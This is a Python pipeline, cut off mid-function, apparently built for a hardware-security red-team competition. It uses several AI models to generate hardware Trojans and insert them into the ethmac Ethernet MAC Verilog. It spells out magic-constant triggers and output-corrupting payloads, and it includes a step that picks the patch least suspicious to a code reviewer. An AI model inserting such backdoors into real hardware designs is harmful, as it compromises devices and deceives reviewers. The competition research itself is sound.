#!/usr/bin/env python3
"""
Ethernet MAC Hardware Trojan Insertion Pipeline
IEEE HOST 2026 AHA Challenge - Phase 1 (Red Team)


Architecture:
 0. Parallel multi-model ideation (Claude + GPT-4o + Gemini) → Claude selects best 3
 1. PyVerilog parses target RTL → structural AST summary
 2. Claude API generates complete modified RTL + testbench (guided by AST summary)
 3. Icarus Verilog simulates: normal op + Trojan trigger
 4. Self-repair loop (up to 3x): failures sent back to Claude for fix
 4b. GPT-4o blue team review: flags suspicious logic → Claude stealth-hardens if needed
 5. Yosys + OpenSTA PPA measurement vs parsed golden baseline
 6. All API calls logged for submission
"""


import os, sys, json, subprocess, shutil, re
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import anthropic


# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
REPO_ROOT   = Path(__file__).parent.parent
ETH_RTL     = REPO_ROOT / "ethmac" / "rtl" / "verilog"
SYNTH_DIR   = REPO_ROOT / "eth_synth"
PIPELINE    = Path(__file__).parent
LOG_DIR     = PIPELINE / "logs"
OUTPUT_DIR  = PIPELINE / "output"

# Ordered list of ethmac RTL files for simulation (ethmac_defines.v must be first)
ETH_RTL_FILES = [
    "ethmac_defines.v",
    "ethmac.v", "eth_miim.v", "eth_clockgen.v", "eth_shiftreg.v",
    "eth_outputcontrol.v", "eth_registers.v", "eth_register.v",
    "eth_maccontrol.v", "eth_receivecontrol.v", "eth_transmitcontrol.v",
    "eth_txethmac.v", "eth_txcounters.v", "eth_txstatem.v",
    "eth_rxethmac.v", "eth_rxcounters.v", "eth_rxstatem.v",
    "eth_rxaddrcheck.v", "eth_crc.v", "eth_wishbone.v",
    "eth_spram_256x32.v", "eth_fifo.v", "eth_macstatus.v", "eth_random.v",
]


LOG_DIR.mkdir(exist_ok=True)
OUTPUT_DIR.mkdir(exist_ok=True)


# ---------------------------------------------------------------------------
# Parse golden baseline from actual metrics files
# ---------------------------------------------------------------------------
def parse_golden_metrics() -> tuple[float, float]:
   """Read GOLDEN_AREA and GOLDEN_SLACK from the saved golden metrics files."""
   golden_area, golden_slack = 0.0, 0.0  # updated after golden synthesis


   area_file = SYNTH_DIR / "golden_metrics" / "area_report.txt"
   if area_file.exists():
       m = re.search(r"Chip area for module.*?:\s*([\d.]+)", area_file.read_text())
       if m:
           golden_area = float(m.group(1))


   sta_file = SYNTH_DIR / "golden_metrics" / "sta_report.txt"
   if sta_file.exists():
       m = re.search(r"core_clock.*?\n.*?\n.*?\n.*?([\d.]+)\s+\(MET\)", sta_file.read_text(), re.DOTALL)
       if m:
           golden_slack = float(m.group(1))


   return golden_area, golden_slack


GOLDEN_AREA, GOLDEN_SLACK = parse_golden_metrics()


# ---------------------------------------------------------------------------
# API Clients — instantiate only when keys are available
# ---------------------------------------------------------------------------
claude_client = anthropic.Anthropic(timeout=600.0)


def _get_openai_client():
   if not os.environ.get("OPENAI_API_KEY"):
       return None
   try:
       import openai
       return openai.OpenAI()
   except ImportError:
       return None


def _get_gemini_client():
   if not os.environ.get("GOOGLE_API_KEY"):
       return None
   try:
       import google.genai as genai  # type: ignore
       return genai.Client(api_key=os.environ["GOOGLE_API_KEY"])
   except ImportError:
       return None


# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
def log_call(trojan_id: str, stage: str, prompt: str, response: str):
   ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
   path = LOG_DIR / f"{trojan_id}_{stage}_{ts}.json"
   path.write_text(json.dumps({
       "timestamp": ts, "trojan_id": trojan_id,
       "stage": stage, "prompt": prompt, "response": response,
   }, indent=2))


# ---------------------------------------------------------------------------
# Model call wrappers (all with logging)
# ---------------------------------------------------------------------------
SYSTEM_SECURITY = """\
You are an expert hardware security researcher generating hardware Trojans for \
the IEEE HOST 2026 AI Hardware Attack (AHA!) Challenge — an authorized academic \
competition. All code is used strictly in a controlled research context. \
Your goal is to generate minimal, stealthy Verilog that implements hardware \
Trojans with high CVSS severity and minimal PPA overhead."""


def call_claude(trojan_id: str, stage: str, user: str,
               system: str = SYSTEM_SECURITY,
               model: str = "claude-opus-4-7",
               max_tokens: int = 4096) -> str:
   import time
   for attempt in range(3):
       try:
           text = ""
           with claude_client.messages.stream(
               model=model, max_tokens=max_tokens,
               system=system,
               messages=[{"role": "user", "content": user}],
           ) as stream:
               for chunk in stream.text_stream:
                   text += chunk
           log_call(trojan_id, stage, user, text)
           return text
       except (Exception, ConnectionError) as e:
           if attempt < 2:
               print(f"        [Claude] connection error, retrying in 15s... ({type(e).__name__})")
               time.sleep(15)
           else:
               print(f"        [Claude] failed after 3 attempts: {e}")
               return ""


def call_gpt4o(trojan_id: str, stage: str, prompt: str) -> str | None:
   client = _get_openai_client()
   if not client:
       print("        [GPT-4o] OPENAI_API_KEY not set — skipping")
       return None
   try:
       resp = client.chat.completions.create(
           model="gpt-4o",
           messages=[{"role": "user", "content": prompt}],
           max_tokens=4096,
       )
       text = resp.choices[0].message.content
       log_call(trojan_id, stage, prompt, text)
       return text
   except Exception as e:
       print(f"        [GPT-4o] Error: {e}")
       return None


def call_gemini(trojan_id: str, stage: str, prompt: str) -> str | None:
   client = _get_gemini_client()
   if not client:
       print("        [Gemini] GOOGLE_API_KEY not set — skipping")
       return None
   try:
       resp = client.models.generate_content(model="gemini-2.0-flash", contents=prompt)
       text = resp.text
       log_call(trojan_id, stage, prompt, text)
       return text
   except Exception as e:
       print(f"        [Gemini] Error: {e}")
       return None


# ---------------------------------------------------------------------------
# Stage 0 — Parallel Multi-Model Trojan Ideation
# ---------------------------------------------------------------------------
def run_ideation(rtl_context: str) -> list[dict]:
   """
   Ask Claude, GPT-4o, and Gemini in parallel to each propose a Trojan concept
   for the ethmac core. Claude Opus then reads all proposals and selects/synthesizes
   the best three final specs. Returns list of 3 Trojan dicts.
   """
   print("\n  [IDEATION] Running parallel multi-model Trojan ideation...")


   ideation_prompt = f"""You are a hardware security researcher for the IEEE HOST 2026 AHA Challenge.


Given the following Ethernet MAC (ethmac) RTL, propose ONE high-CVSS, stealthy hardware Trojan concept.


ethmac RTL (ethmac.v excerpt):
```verilog
{rtl_context[:4000]}
```


Key signals available in ethmac.v:
- Wishbone bus: wb_dat_i[31:0], wb_adr_i[11:2], wb_we_i, wb_cyc_i, wb_stb_i, wb_clk_i, wb_rst_i
- WB output: wb_dat_o[31:0] (driven via temp_wb_dat_o_reg with ETH_REGISTERED_OUTPUTS)
- TX PHY: mtxd_pad_o[3:0] (nibble to PHY), mtxen_pad_o (TX enable)
- RX PHY: mrxd_pad_i[3:0], mrxdv_pad_i (receive data)
- There is an existing `always @ (posedge wb_clk_i or posedge wb_rst_i)` block at the top that manages temp_wb_dat_o_reg, temp_wb_ack_o_reg, temp_wb_err_o_reg — ideal for inserting a trigger latch.
- The `assign wb_dat_o[31:0] = temp_wb_dat_o_reg;` (active because ETH_REGISTERED_OUTPUTS is defined) is a good payload target.


Provide:
1. Trojan name
2. Target file (ethmac.v is preferred for simplicity)
3. Trigger condition (be specific — use a 32-bit magic constant on wb_dat_i when wb_we_i && wb_stb_i)
4. Payload (what does it do? affect wb_dat_o, mtxd_pad_o, or mtxen_pad_o)
5. CVSS estimate and justification
6. Why it would be hard to detect
"""


   proposals = {}


   def ideate_claude():
       resp = call_claude("ideation", "claude_propose", ideation_prompt)
       proposals["claude"] = resp
       print("        [Claude]  proposal received")


   def ideate_gpt():
       resp = call_gpt4o("ideation", "gpt_propose", ideation_prompt)
       if resp:
           proposals["gpt4o"] = resp
           print("        [GPT-4o]  proposal received")


   def ideate_gemini():
       resp = call_gemini("ideation", "gemini_propose", ideation_prompt)
       if resp:
           proposals["gemini"] = resp
           print("        [Gemini]  proposal received")


   with ThreadPoolExecutor(max_workers=3) as ex:
       futures = [ex.submit(ideate_claude), ex.submit(ideate_gpt), ex.submit(ideate_gemini)]
       for f in as_completed(futures):
           f.result()


   # Save all proposals
   (LOG_DIR / "ideation_proposals.json").write_text(json.dumps(proposals, indent=2))
   print(f"        Received proposals from: {list(proposals.keys())}")


   # Claude Opus synthesizes and selects the best 3
   proposals_text = "\n\n".join(f"=== {k.upper()} PROPOSAL ===\n{v}" for k, v in proposals.items())


   selection_prompt = f"""You have received hardware Trojan proposals from multiple AI models for the IEEE HOST 2026 AHA Challenge (authorized competition targeting the OpenCores ethmac Ethernet MAC).


{proposals_text}


Review all proposals and select or synthesize the 3 best Trojan concepts. Prioritize:
1. High CVSS score (7.0+ preferred)
2. Minimal PPA overhead — HARD REQUIREMENT: each Trojan must use exactly ONE new 1-bit register (trojan_armed) and ONE 32-bit magic-constant comparison on wb_dat_i. No counters, no multi-register schemes, no wide comparators beyond 32 bits.
3. Target ethmac.v for all 3 — it has a suitable wb_clk_i always block for the trigger latch and assign wb_dat_o for the payload
4. Trigger: single magic-constant check `wb_dat_i == 32'hXXXXXXXX && wb_we_i && wb_stb_i` — NOT counter overflow, NOT multi-cycle sequences
5. Variety: one Confidentiality (corrupt wb_dat_o to leak info), one Integrity (flip bits in wb_dat_o or mtxd_pad_o), one Availability (disable mtxen_pad_o or zero wb_dat_o)
6. Each trigger constant must be different and obviously artificial (e.g. 0xDEADBEEF, 0xCAFEBABE, 0xBAADF00D)

Return EXACTLY this JSON structure (no markdown, just JSON):
{{
 "selection_reasoning": "your analysis of the proposals",
 "trojans": [
   {{
     "id": "trojan_1",
     "name": "...",
     "target_file": "ethmac.v",
     "trigger": "wb_dat_i == 32'hDEADBEEF && wb_we_i && wb_stb_i (sampled on posedge wb_clk_i)",
     "payload": "exact payload description (affect wb_dat_o, mtxd_pad_o, or mtxen_pad_o)",
     "cvss_notes": "CVSS vector and estimated score"
   }},
   {{
     "id": "trojan_2",
     "name": "...",
     "target_file": "ethmac.v",
     "trigger": "wb_dat_i == 32'hCAFEBABE && wb_we_i && wb_stb_i",
     "payload": "...",
     "cvss_notes": "..."
   }},
   {{
     "id": "trojan_3",
     "name": "...",
     "target_file": "ethmac.v",
     "trigger": "wb_dat_i == 32'hBAADF00D && wb_we_i && wb_stb_i",
     "payload": "...",
     "cvss_notes": "..."
   }}
 ]
}}
"""


   print("        Claude Opus selecting best 3 from all proposals...")
   selection_resp = call_claude("ideation", "claude_select", selection_prompt)


   # Parse JSON from response
   try:
       json_match = re.search(r'\{.*\}', selection_resp, re.DOTALL)
       if json_match:
           data = json.loads(json_match.group(0))
           trojans = data.get("trojans", [])
           reasoning = data.get("selection_reasoning", "")
           (LOG_DIR / "ideation_selection.json").write_text(
               json.dumps({"reasoning": reasoning, "trojans": trojans}, indent=2)
           )
           if len(trojans) == 3:
               print(f"        Selected trojans: {[t['name'] for t in trojans]}")
               return trojans
   except Exception as e:
       print(f"        Ideation JSON parse error: {e} — using default specs")


   return None  # caller falls back to default specs




# ---------------------------------------------------------------------------
# Code extraction helpers + hardware budget validation
# ---------------------------------------------------------------------------
def _code_lines(rtl: str) -> list[str]:
   """Non-blank, non-comment lines — proxy for synthesizable logic."""
   return [l for l in rtl.splitlines()
           if l.strip() and not l.strip().startswith("//")]


def check_rtl_budget(orig_rtl: str, new_rtl: str) -> tuple[bool, str]:
   """Return (ok, reason). Enforces minimal hardware budget vs original RTL."""
   reasons = []

   # 1. Reg / wire declaration counts
   orig_regs  = len(re.findall(r'^\s*reg\b',  orig_rtl, re.MULTILINE))
   new_regs   = len(re.findall(r'^\s*reg\b',  new_rtl,  re.MULTILINE))
   orig_wires = len(re.findall(r'^\s*wire\b', orig_rtl, re.MULTILINE))
   new_wires  = len(re.findall(r'^\s*wire\b', new_rtl,  re.MULTILINE))
   if new_regs - orig_regs > 1:
       reasons.append(f"+{new_regs - orig_regs} regs (max 1)")
   if new_wires > orig_wires:
       reasons.append(f"+{new_wires - orig_wires} wires (max 0)")

   # 2. Code-line delta — catches both bloat AND deletions of existing logic
   orig_code_count = len(_code_lines(orig_rtl))
   new_code_count  = len(_code_lines(new_rtl))
   delta_code = new_code_count - orig_code_count
   if delta_code > 8:
       reasons.append(f"+{delta_code} code lines (max 8)")
   if delta_code < -3:
       reasons.append(f"{delta_code} code lines removed (max 3 deletions — Trojan must not remove existing logic)")

   # 3. Verify critical ethmac logic preserved — CDC regs and WB output must not be removed
   for pattern in [
       r'temp_wb_dat_o_reg\s*<=\s*temp_wb_dat_o',  # WB output register update
       r'temp_wb_ack_o_reg\s*<=',                   # ACK register update
       r'WillSendControlFrame_sync',                 # CDC chain must survive
   ]:
       if re.search(pattern, orig_rtl) and not re.search(pattern, new_rtl):
           reasons.append(f"existing logic removed/changed: '{pattern}'")

   # 4. No wide comparisons — 256-bit comparator = ~500 extra gates
   new_code = "\n".join(l for l in new_rtl.splitlines()
                        if l not in orig_rtl.splitlines())
   if re.search(r'\[25[0-9]:', new_code):
       reasons.append("wide (>32-bit) comparator in new code")

   # 5. No nested ternary anywhere in result assigns
   for m in re.finditer(r'assign\s+result.*?=(.*?);', new_rtl, re.DOTALL):
       if m.group(1).count('?') > 1:
           reasons.append("nested ternary in result assign")
           break

   # 6. No second always block for trojan_armed (must live inside reg_update)
   extra_always = [l for l in new_rtl.splitlines()
                   if l not in orig_rtl.splitlines() and 'always' in l and '@' in l]
   if extra_always:
       reasons.append("new always block added (trojan_armed must go inside existing reg_update)")

   if reasons:
       return False, "; ".join(reasons)
   return True, "ok"


def clean_verilog(code: str, strip_timescale: bool = True) -> str:
   """Strip directives that break multi-file iverilog compilation."""
   return "\n".join(
       l for l in code.splitlines()
       if not l.strip().startswith("`default_nettype")
       and (not strip_timescale or not l.strip().startswith("`timescale"))
   )


def extract_block(text: str, tag: str) -> str:
   # Try exact tag with closing fence
   m = re.search(rf"```{tag}\n(.*?)```", text, re.DOTALL)
   if m:
       return m.group(1).strip()
   # Try exact tag without closing fence (truncated response)
   m = re.search(rf"```{tag}\n(.*?)(?:```|$)", text, re.DOTALL)
   if m:
       return m.group(1).strip()
   # Fallback: all fenced blocks (any tag)
   all_blocks = re.findall(r"```\w+\n(.*?)(?:```|$)", text, re.DOTALL)
   if not all_blocks:
       return ""
   if tag == "testbench":
       return all_blocks[-1].strip()  # last block, whether 1 or many
   return all_blocks[0].strip()


# ---------------------------------------------------------------------------
# PyVerilog AST Analysis
# ---------------------------------------------------------------------------
def ast_summary(verilog_path: Path) -> str:
   """Parse Verilog with PyVerilog, return structural summary for Claude context."""
   try:
       from pyverilog.vparser.parser import parse as vparse
       ast, _ = vparse([str(verilog_path)],
                       preprocess_include=[str(verilog_path.parent)])


       lines = [f"AST Summary for {verilog_path.name}:"]
       for defn in ast.description.definitions:
           lines.append(f"\nModule: {defn.name}")


           if hasattr(defn, 'portlist') and defn.portlist:
               ports = []
               for p in defn.portlist.ports:
                   if hasattr(p, 'name'):
                       ports.append(str(p.name))
                   elif hasattr(p, 'first') and hasattr(p.first, 'name'):
                       ports.append(str(p.first.name))
               lines.append(f"  Ports: {', '.join(ports)}")


           assigns, always_blocks, regs, wires = [], [], [], []
           if hasattr(defn, 'items') and defn.items:
               for item in defn.items:
                   t = type(item).__name__
                   if t == 'Assign':
                       assigns.append(str(item.left.var))
                   elif t == 'Always':
                       always_blocks.append("always block")
                   elif t == 'Decl':
                       for d in item.list:
                           dt = type(d).__name__
                           if dt == 'Reg':
                               regs.append(str(d.name))
                           elif dt == 'Wire':
                               wires.append(str(d.name))


           if assigns:
               lines.append(f"  Continuous assigns driving: {', '.join(assigns)}")
           if always_blocks:
               lines.append(f"  Always blocks: {len(always_blocks)}")
           if regs:
               lines.append(f"  Key registers: {', '.join(regs[:20])}")
           if wires:
               lines.append(f"  Key wires: {', '.join(wires[:20])}")


       return "\n".join(lines)
   except Exception as e:
       return f"PyVerilog parse note: {e} — proceeding with RTL text only"


# ---------------------------------------------------------------------------
# Stage 1 — Generate modified RTL + testbench (patch-based for large files)
# ---------------------------------------------------------------------------

# Known anchor lines in ethmac.v for surgical patch insertion (8-space indent)
_ETH_RESET_ANCHOR  = "        temp_wb_err_o_reg <= 1'b0;"
_ETH_ELSE_ANCHOR   = "        temp_wb_err_o_reg <= temp_wb_err_o & ~temp_wb_err_o_reg;"
_ETH_ASSIGN_ANCHOR = "  assign wb_dat_o[31:0] = temp_wb_dat_o_reg;"
_ETH_REG_ANCHOR    = "reg             WillSendControlFrame_sync1;"


def apply_eth_patch(orig_rtl: str, patch: dict) -> str:
   """Apply a 4-field patch dict to ethmac.v without touching any other lines."""
   lines = orig_rtl.splitlines(keepends=True)
   out = []
   reg_inserted = False
   anchors_hit = {"reset": False, "else": False, "assign": False}
   for line in lines:
       stripped = line.rstrip()
       # (a) Insert reg declaration after the WillSendControlFrame reg block
       if not reg_inserted and _ETH_REG_ANCHOR in stripped:
           out.append(line)
           out.append(f"reg             trojan_armed;\n")
           reg_inserted = True
           continue
       # (b1) Reset branch: insert after last reset assignment
       if _ETH_RESET_ANCHOR in stripped:
           out.append(line)
           out.append(f"        {patch['reset_line']}\n")
           anchors_hit["reset"] = True
           continue
       # (b2) Else branch: insert trigger after last else assignment
       if _ETH_ELSE_ANCHOR in stripped:
           out.append(line)
           out.append(f"        {patch['trigger_line']}\n")
           anchors_hit["else"] = True
           continue
       # (c) Replace the assign wb_dat_o line
       if _ETH_ASSIGN_ANCHOR in stripped:
           out.append(f"  {patch['assign_line']}\n")
           anchors_hit["assign"] = True
           continue
       out.append(line)
   missed = [k for k, v in anchors_hit.items() if not v]
   if missed:
       print(f"        WARNING: patch anchors not found: {missed} — trojan may be incomplete")
   return "".join(out)


def _build_patch_prompt(spec: dict, prior_specs: list[dict]) -> str:
   """Build the patch generation prompt with dynamic context from prior trojans."""
   used_constants = []
   used_types = []
   for s in prior_specs:
       m = re.search(r"32'h([0-9A-Fa-f]{8})", s.get("trigger", ""))
       if m:
           used_constants.append(f"32'h{m.group(1)}")
       if "payload_type" in s:
           used_types.append(s["payload_type"])

   dynamic_ctx = ""
   if used_constants:
       dynamic_ctx += f"\nALREADY USED trigger constants (choose a DIFFERENT one): {', '.join(used_constants)}\n"
   if used_types:
       dynamic_ctx += f"ALREADY COVERED payload types (choose a DIFFERENT class): {', '.join(used_types)}\n"

   return f"""## Task
Generate a MINIMAL hardware Trojan PATCH for the IEEE HOST 2026 AHA Challenge.
Do NOT output the full file — output ONLY the 3 specific code fragments below.
{dynamic_ctx}
## Trojan Specification
- **Name:** {spec["name"]}
- **Trigger:** {spec["trigger"]}
- **Payload:** {spec["payload"]}
- **CVSS context:** {spec.get("cvss_notes", "")}

## Context: ethmac.v insertion points
- Reset branch anchor (insert reset value after):
  `          temp_wb_err_o_reg <= 1'b0;`
- Else branch anchor (insert trigger after):
  `          temp_wb_err_o_reg <= temp_wb_err_o & ~temp_wb_err_o_reg;`
- Assign line to REPLACE:
  `  assign wb_dat_o[31:0] = temp_wb_dat_o_reg;`

Available signals: `wb_dat_i[31:0]`, `wb_we_i`, `wb_stb_i`, `wb_cyc_i`,
`temp_wb_dat_o_reg[31:0]`, `trojan_armed` (the new 1-bit reg).

## Rules
- Trigger: single 32-bit comparison on wb_dat_i with magic constant + wb_we_i && wb_stb_i
- Payload: modify `assign wb_dat_o[31:0]` — ternary with trojan_armed condition
- PPA OPTIMIZATION: if payload only changes N bits, use partial assignment:
  `assign wb_dat_o[31:0] = trojan_armed ? {{temp_wb_dat_o_reg[31:N], <N-bit payload>}} : temp_wb_dat_o_reg;`
- Magic constant must NOT be 32'h0000007F (normal-op test value)
- CRITICAL: assign_line MUST use ONLY temp_wb_dat_o_reg and/or constants.
  Do NOT reference mtxd_pad_o, mtxen_pad_o, or ANY other PHY/TX/RX signals — they are x in simulation.

Return EXACTLY this JSON (no markdown):
{{
  "reset_line":   "trojan_armed <= 1'b0;",
  "trigger_line": "if (wb_dat_i == 32'hXXXXXXXX && wb_we_i && wb_stb_i) trojan_armed <= 1'b1;",
  "assign_line":  "assign wb_dat_o[31:0] = trojan_armed ? ... : temp_wb_dat_o_reg;"
}}
"""


def _extract_json(text: str, required_keys: tuple = ()) -> dict | None:
   """Extract first valid JSON object from text, handling { } inside string values."""
   start = text.find('{')
   if start == -1:
       return None
   depth = 0
   in_string = False
   escape = False
   for i, ch in enumerate(text[start:], start):
       if escape:
           escape = False
           continue
       if ch == '\\' and in_string:
           escape = True
           continue
       if ch == '"':
           in_string = not in_string
           continue
       if in_string:
           continue
       if ch == '{':
           depth += 1
       elif ch == '}':
           depth -= 1
           if depth == 0:
               try:
                   obj = json.loads(text[start:i + 1])
                   if not required_keys or all(k in obj for k in required_keys):
                       return obj
               except Exception:
                   pass
               break
   return None


def _extract_patch_json(text: str) -> dict | None:
   return _extract_json(text, required_keys=("reset_line", "trigger_line", "assign_line"))


def _call_patch(spec: dict, prior_specs: list[dict]) -> dict | None:
   """Generate one patch JSON. Returns parsed dict or None."""
   resp = call_claude(spec["id"], "generate_patch",
                      _build_patch_prompt(spec, prior_specs),
                      model="claude-sonnet-4-6", max_tokens=512)
   return _extract_patch_json(resp)


def _select_best_patch(spec: dict, p1: dict | None, p2: dict | None) -> dict | None:
   """Use GPT-4o to pick the stealthier of two patches. Falls back to first valid one."""
   if not p1 and not p2:
       return None
   if not p1:
       return p2
   if not p2:
       return p1
   # Both valid — ask GPT-4o which looks more like normal Wishbone bus logic
   sel_prompt = f"""Two hardware Trojan patches for the same ethmac trigger/payload.
Pick the one whose signal names and expressions look MORE like normal Wishbone bus logic
(less suspicious to a code reviewer). Answer ONLY "A" or "B".

Candidate A:
  trigger: {p1['trigger_line']}
  assign:  {p1['assign_line']}

Candidate B:
  trigger: {p2['trigger_line']}
  assign:  {p2['assign_line']}
"""
   resp = call_gpt4o(spec["id"], "patch_select", sel_prompt) or ""
   if resp.strip().upper().startswith("B"):
       print("        [best-of-2] GPT-4o selected candidate B")
       return p2
   print("        [best-of-2] GPT-4o selected candidate A")
   return p1


def generate_trojan(spec: dict, prior_specs: list[dict] = []) -> tuple[str, str]:
   rtl_text = (ETH_RTL / spec["target_file"]).read_text()
   ast_summary(ETH_RTL / spec["target_file"])  # still logged

   # Best-of-2: generate two patches in parallel, GPT-4o picks stealthier one
   with ThreadPoolExecutor(max_workers=2) as ex:
       f1 = ex.submit(_call_patch, spec, prior_specs)
       f2 = ex.submit(_call_patch, spec, prior_specs)
       patch1, patch2 = f1.result(), f2.result()

   patch = _select_best_patch(spec, patch1, patch2)

   rtl_code = ""
   if patch:
       rtl_code = apply_eth_patch(rtl_text, patch)
   else:
       print(f"        Patch generation failed for both candidates")



   tb_prompt = f"""
## Task
Write a complete self-contained Verilog testbench for verifying a hardware Trojan in the OpenCores ethmac Ethernet MAC.

## Trojan Specification
- **Trigger:** {spec["trigger"]}
- **Payload:** {spec["payload"]}

## ethmac DUT Interface (module name: ethmac)
Ports:
  input  wb_clk_i, wb_rst_i
  input  [31:0] wb_dat_i   output [31:0] wb_dat_o
  input  [11:2] wb_adr_i   input  [3:0]  wb_sel_i
  input  wb_we_i, wb_cyc_i, wb_stb_i
  output wb_ack_o, wb_err_o
  output [31:2] m_wb_adr_o  output [3:0] m_wb_sel_o
  output m_wb_we_o          input  [31:0] m_wb_dat_i
  output [31:0] m_wb_dat_o  output m_wb_cyc_o, m_wb_stb_o
  input  m_wb_ack_i, m_wb_err_i
  output [2:0] m_wb_cti_o   output [1:0] m_wb_bte_o
  input  mtx_clk_pad_i      output [3:0] mtxd_pad_o
  output mtxen_pad_o, mtxerr_pad_o
  input  mrx_clk_pad_i      input  [3:0] mrxd_pad_i
  input  mrxdv_pad_i, mrxerr_pad_i, mcoll_pad_i, mcrs_pad_i
  output mdc_pad_o          input  md_pad_i
  output md_pad_o, md_padoe_o
  output int_o

## Wishbone Transaction Tasks
Define tasks wb_write(addr, data) and wb_read(addr, output data) that:
- Assert wb_cyc_i=1, wb_stb_i=1, drive addr to wb_adr_i[11:2], data to wb_dat_i
- For write: set wb_we_i=1, wb_sel_i=4'hF
- For read:  set wb_we_i=0
- Wait 10 clock cycles (with ETH_REGISTERED_OUTPUTS, ack comes ~2 cycles late — use #100 fixed delay instead of polling to avoid hangs)
- Then deassert cyc, stb

## ethmac Register Addresses (wb_adr_i = byte_addr >> 2)
- MODER    : 10'h0  (offset 0x00) — mode register, reset value 32'hA000
- INT_MASK : 10'h2  (offset 0x08) — interrupt mask, writable
- TX_BD_NUM: 10'h8  (offset 0x20) — TX BD count, default 32'h40

## Requirements
- Module name: `tb_{spec["id"]}`. WB clock: `always #5 wb_clk_i = ~wb_clk_i` (10ns). PHY clocks: `always #10 mtx_clk_pad_i = ~mtx_clk_pad_i; always #10 mrx_clk_pad_i = ~mrx_clk_pad_i;`
- Drive unused inputs to safe defaults: m_wb_ack_i=0, m_wb_err_i=0, m_wb_dat_i=0, mrxd_pad_i=0, mrxdv_pad_i=0, mrxerr_pad_i=0, mcoll_pad_i=0, mcrs_pad_i=0, md_pad_i=1
- Apply wb_rst_i=1 for 10 cycles then wb_rst_i=0.
- **Section 1 — Normal op:** Write INT_MASK register (addr=10'h2) with 32'h7F. Then read INT_MASK back (addr=10'h2). If read_data[6:0] == 7'h7F → print `NORMAL_OP_PASS`. Else print `NORMAL_OP_FAIL`.
- **Section 2 — Trojan trigger:** Issue wb_write with the magic trigger data ({spec["trigger"]}). Then wait 20 cycles. Print `TROJAN_TRIGGERED`.
- End: `$display("TEST_COMPLETE"); $finish;`
- No `default_nettype, no `timescale. Under 200 lines.
- IMPORTANT: Do NOT poll wb_ack_o in a while loop — use fixed #100 delays to avoid simulation hangs.

```testbench
<complete testbench ending with endmodule>
```
"""

   tb_raw = extract_block(
       call_claude(spec["id"], "generate_tb", tb_prompt, model="claude-sonnet-4-6", max_tokens=6000),
       "testbench"
   )
   if tb_raw and "endmodule" not in tb_raw:
       tb_raw = tb_raw.rstrip() + '\nend\nendmodule\n'
   return rtl_code, tb_raw


# ---------------------------------------------------------------------------
# Stage 2 — Self-repair
# ---------------------------------------------------------------------------
def repair_trojan(spec: dict, rtl: str, tb: str, error: str, attempt: int) -> tuple[str, str]:
   orig_rtl_text = (ETH_RTL / spec["target_file"]).read_text()

   # For ethmac, RTL is generated via patch. Re-patch on NORMAL_OP_FAIL or compile errors
   # that implicate the RTL; otherwise just fix the testbench.
   rtl_error = "COMPILE ERROR" in error or "NORMAL_OP_FAIL" in error or "undeclared" in error

   new_rtl = rtl  # default: keep existing RTL
   if rtl_error:
       patch_fix_prompt = f"""
## Repair (attempt {attempt}/3) — {spec["name"]}

Error:
```
{error[:1500]}
```

{"CRITICAL — NORMAL_OP_FAIL diagnosis: one of these caused it (fix ALL):" if "NORMAL_OP_FAIL" in error else ""}
{"  1. Trigger constant matched 32'h0000007F (the normal-op write value) — change it to 32'hDEADBEEF, 32'hCAFEBABE, or 32'hBAADF00D." if "NORMAL_OP_FAIL" in error else ""}
{"  2. Payload used PHY signals (mtxd_pad_o, mtxen_pad_o) that are x in simulation — assign_line MUST use ONLY temp_wb_dat_o_reg and constants." if "NORMAL_OP_FAIL" in error else ""}
{"  3. trojan_armed was x (not reset) — ensure reset_line = trojan_armed <= 1'b0;" if "NORMAL_OP_FAIL" in error else ""}

Produce a fixed patch JSON. Rules:
- reset_line: always `trojan_armed <= 1'b0;`
- trigger_line: `if (wb_dat_i == 32'hXXXXXXXX && wb_we_i && wb_stb_i) trojan_armed <= 1'b1;` — use 32'hDEADBEEF, 32'hCAFEBABE, or 32'hBAADF00D
- assign_line: `assign wb_dat_o[31:0] = trojan_armed ? <payload> : temp_wb_dat_o_reg;`
- ONLY use temp_wb_dat_o_reg and constants in assign_line — NO PHY signals

Return ONLY JSON:
{{"reset_line":"trojan_armed <= 1'b0;","trigger_line":"if (wb_dat_i == 32'hDEADBEEF && wb_we_i && wb_stb_i) trojan_armed <= 1'b1;","assign_line":"assign wb_dat_o[31:0] = trojan_armed ? {{~temp_wb_dat_o_reg[31:16], temp_wb_dat_o_reg[15:0]}} : temp_wb_dat_o_reg;"}}
"""
       patch_resp = call_claude(spec["id"], f"repair_patch_{attempt}", patch_fix_prompt,
                                model="claude-sonnet-4-6", max_tokens=512)
       patch = _extract_patch_json(patch_resp)
       if patch:
           new_rtl = apply_eth_patch(orig_rtl_text, patch)

   tb_fix_prompt = f"""
Fix this ethmac testbench. Simulation error:
```
{error[:1000]}
```

### Current Testbench
```verilog
{tb[:3000]}
```

Rules:
- DUT module name: ethmac. Clock: wb_clk_i (10ns). PHY clocks: mtx_clk_pad_i, mrx_clk_pad_i (20ns).
- wb_adr_i is [11:2] (10 bits). Do NOT poll wb_ack_o — use fixed #100 delays.
- Section 1: Write INT_MASK (addr=10'h2) with 32'h7F, read back, print NORMAL_OP_PASS/FAIL.
- Section 2: wb_write trigger magic constant, wait, print TROJAN_TRIGGERED.
- End: TEST_COMPLETE + $finish. No `timescale or `default_nettype.

```testbench
<fixed complete testbench ending with endmodule>
```
"""
   tb_resp = call_claude(spec["id"], f"repair_tb_{attempt}", tb_fix_prompt,
                         model="claude-sonnet-4-6", max_tokens=4096)
   new_tb = extract_block(tb_resp, "testbench") or tb
   return new_rtl, new_tb


# ---------------------------------------------------------------------------
# Stage 3 — Simulation
# ---------------------------------------------------------------------------
def run_simulation(trojan_id: str, tb_path: Path, modified_rtl: Path) -> tuple[bool, str]:
   rtl_list = [
       modified_rtl if f == modified_rtl.name else ETH_RTL / f
       for f in ETH_RTL_FILES
   ]
   sim_bin  = OUTPUT_DIR / trojan_id / "sim_out"


   # -I ETH_RTL so `include "timescale.v" resolves correctly in ethmac source files
   cmd = ["iverilog", "-g2012", f"-I{ETH_RTL}", "-o", str(sim_bin), str(tb_path)] + [str(f) for f in rtl_list]
   try:
       r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
       if r.returncode != 0:
